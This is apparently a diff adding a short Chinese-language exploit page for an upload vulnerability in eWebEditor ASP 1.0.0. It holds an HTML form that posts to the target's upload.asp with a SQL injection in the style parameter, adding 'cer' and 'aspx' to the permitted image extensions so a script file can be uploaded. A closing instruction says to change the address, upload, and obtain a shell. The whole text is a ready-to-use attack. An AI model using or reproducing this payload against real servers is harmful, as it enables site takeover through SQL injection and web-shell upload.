@@ -1,0 +1,7 @@
+ewebeditor 1.0.0 上传漏洞：
+<H1>ewebeditor asp版 1.0.0 上传漏洞利用程序----By HCocoa</H1><br><br>
+<form action="http://要上传的地址/ewebeditor/upload.asp?action=save&type=IMAGE&style=hcocoa' union select S_ID,S_Name,S_Dir,S_EditorHeader,S_Body,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|cer|aspx',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=100><br><br>
+<input type=submit value=Fuck>
+</form>
+把地址修改一下，本地上传，拿到shell
